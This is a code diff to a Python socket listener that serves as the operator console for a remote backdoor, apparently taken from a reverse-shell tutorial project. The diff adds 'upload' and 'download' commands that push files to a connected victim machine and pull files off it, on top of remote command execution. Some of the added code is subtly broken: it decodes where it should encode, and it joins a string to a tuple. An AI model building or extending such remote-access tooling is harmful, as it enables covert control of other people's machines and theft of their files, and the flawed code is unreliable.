@@ -1,3 +1,4 @@
+import base64
 import json
 import simplejson
 import socket
@@ -13,7 +14,7 @@ class SocketListener:
         listener.listen(0)
         print("Listening ...")
         (self.connection, address) = listener.accept()
-        print("Connection OK")
+        print("Connected from" + address)
 
     def data_receive(self):
         data = ""
@@ -31,15 +32,31 @@ class SocketListener:
             exit()
         return self.data_receive()
 
+    def get_file_content(self, path):
+        with open(path, "rb") as f:
+            return base64.b64decode(f.read())
+
+    def save_file(self, path, content):
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(content))
+            return "Successfully Downloaded"
+
     def start_listener(self):
         while True:
             command = input("Enter command => ")
             command = command.split(" ")
             try:
-                command = self.execute(command)
+                if command[0] == "upload":
+                    file_content = self.get_file_content(command[1])
+                    command.append(file_content)
+
+                result = self.execute(command)
+
+                if command[0] == "download":
+                    result = self.save_file(command[1], result)
             except Exception:
-                command = "Error"
-            print(command)
+                result = "Error"
+            print(result)
 
 
 connect_info = ""
